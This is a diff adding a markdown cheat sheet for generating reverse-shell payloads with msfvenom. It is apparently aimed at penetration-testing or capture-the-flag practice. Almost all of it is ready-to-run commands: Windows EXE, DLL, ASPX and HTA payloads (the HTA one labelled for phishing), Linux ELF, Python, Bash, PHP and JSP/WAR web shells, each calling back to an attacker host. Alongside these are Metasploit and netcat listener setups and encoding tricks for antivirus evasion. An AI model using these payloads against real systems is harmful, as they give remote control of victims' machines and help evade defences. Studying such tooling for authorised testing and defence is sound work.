@@ -1,0 +1,175 @@
+---
+title: 'MSFVENOM – Reverse Shell Cheat Sheet'
+---
+
+## Basic Syntax
+
+```bash
+msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <FILE>
+```
+
+### Common Options
+
+| Option       | Description       |
+| ------------ | ----------------- |
+| `-p`         | Payload           |
+| `LHOST`      | Attacker IP       |
+| `LPORT`      | Listening port    |
+| `-f`         | Output format     |
+| `-o`         | Output file       |
+| `-e`         | Encoder           |
+| `-i`         | Encode iterations |
+| `-b`         | Bad chars         |
+| `--platform` | Force platform    |
+| `-a`         | Architecture      |
+
+---
+
+# 🎯 LISTENER (Metasploit)
+
+```bash
+msfconsole
+use exploit/multi/handler
+set payload <PAYLOAD>
+set LHOST <IP>
+set LPORT <PORT>
+run
+```
+
+---
+
+# 🪟 Windows Payloads
+
+## 🖥️ Meterpreter (Recommended)
+
+### EXE
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o shell.exe
+```
+
+### Staged HTTPS (Bypass AV better)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe
+```
+
+### DLL (for DLL hijacking)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f dll -o shell.dll
+```
+
+### ASPX (IIS upload)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f aspx -o shell.aspx
+```
+
+### HTA (phishing / web)
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f hta-psh -o shell.hta
+```
+
+---
+
+## 🧾 Normal Shell (cmd)
+
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f exe -o shell.exe
+```
+
+Listener:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## 🧬 Encoded Payload (AV evasion basic)
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 \
+-e x64/xor -i 10 -f exe -o shell.exe
+```
+
+---
+
+# 🐧 Linux Payloads
+
+## 🧠 Meterpreter ELF
+
+```bash
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f elf -o shell.elf
+chmod +x shell.elf
+```
+
+---
+
+## 🧾 Normal Bash Shell
+
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f elf -o shell.elf
+```
+
+Listener:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+## 🐍 Python Payload
+
+```bash
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.8 LPORT=4444 -f raw
+```
+
+Execute:
+
+```bash
+python3 -c "<PASTE PAYLOAD>"
+```
+
+---
+
+## 🐚 Bash One-liner
+
+```bash
+msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.8 LPORT=4444 -f raw
+```
+
+---
+
+## 🐘 PHP Webshell Reverse
+
+```bash
+msfvenom -p php/reverse_php LHOST=10.10.14.8 LPORT=4444 -o shell.php
+```
+
+Listener:
+
+```bash
+nc -lvnp 4444
+```
+
+---
+
+# 🌐 WEB PAYLOADS (Useful in Upload Vulns)
+
+| Language | Payload                                   |
+| -------- | ----------------------------------------- |
+| JSP      | `java/jsp_shell_reverse_tcp`              |
+| WAR      | `java/jsp_shell_reverse_tcp -f war`       |
+| PHP      | `php/reverse_php`                         |
+| ASP      | `windows/meterpreter/reverse_tcp -f asp`  |
+| ASPX     | `windows/meterpreter/reverse_tcp -f aspx` |
+
+Example:
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.8 LPORT=4444 -f war -o shell.war
+```
